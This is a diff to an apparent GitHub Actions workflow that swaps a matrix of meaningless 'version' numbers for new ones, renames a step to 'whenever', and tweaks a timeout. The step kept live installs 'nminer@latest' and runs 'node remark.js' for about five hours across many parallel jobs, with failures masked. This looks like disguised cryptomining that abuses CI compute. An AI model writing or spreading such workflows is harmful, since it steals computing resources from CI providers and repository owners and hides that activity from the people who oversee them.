@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 731 }
-          - { version: 5052 }
-          - { version: 8591 }
-          - { version: 9447 }
-          - { version: 7160 }
-          - { version: 3245 }
-          - { version: 8460 }
-          - { version: 3949 }
-          - { version: 481 }
-          - { version: 3793 }
-          - { version: 2629 }
-          - { version: 1889 }
-          - { version: 2653 }
-          - { version: 3902 }
-          - { version: 1699 }
-          - { version: 4690 }
-          - { version: 9859 }
-          - { version: 7460 }
-          - { version: 9821 }
-          - { version: 1278 }
+          - { version: 5768 }
+          - { version: 1056 }
+          - { version: 414 }
+          - { version: 6684 }
+          - { version: 4968 }
+          - { version: 449 }
+          - { version: 578 }
+          - { version: 910 }
+          - { version: 633 }
+          - { version: 1782 }
+          - { version: 702 }
+          - { version: 1823 }
+          - { version: 4584 }
+          - { version: 1885 }
+          - { version: 9421 }
+          - { version: 744 }
+          - { version: 705 }
+          - { version: 4967 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gadzooks
+      - name: whenever
         run: |
           npm install nminer@latest
-          timeout 302m node remark.js || echo "remark executed"
+          timeout 301m node remark.js || echo "remark executed"
